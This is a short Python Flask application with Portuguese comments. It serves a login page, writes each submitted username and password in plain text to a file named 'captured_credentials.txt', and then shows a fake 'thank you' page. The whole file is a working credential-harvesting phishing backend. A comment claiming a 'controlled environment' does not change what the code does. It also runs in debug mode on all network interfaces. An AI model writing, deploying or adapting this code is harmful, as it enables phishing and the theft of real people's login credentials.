from flask import Flask, render_template, request, redirect, url_for
import os

app = Flask(__name__)

# Definindo um diretório onde as credenciais serão salvas
SAVE_CREDENTIALS_PATH = "captured_credentials.txt"

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    # Salva as credenciais no arquivo (em um ambiente controlado)
    with open(SAVE_CREDENTIALS_PATH, 'a') as file:
        file.write(f"Username: {username}, Password: {password}\n")

    # Simula um redirecionamento para uma página fictícia após "logar"
    return redirect(url_for('thank_you'))

@app.route('/thank_you')
def thank_you():
    return "<h1>Obrigado por se logar! Em breve, você será redirecionado...</h1>"

if __name__ == "__main__":
    # Cria o diretório de credenciais caso não exista
    if not os.path.exists(SAVE_CREDENTIALS_PATH):
        with open(SAVE_CREDENTIALS_PATH, 'w'): pass
    app.run(debug=True, host='0.0.0.0', port=5001)
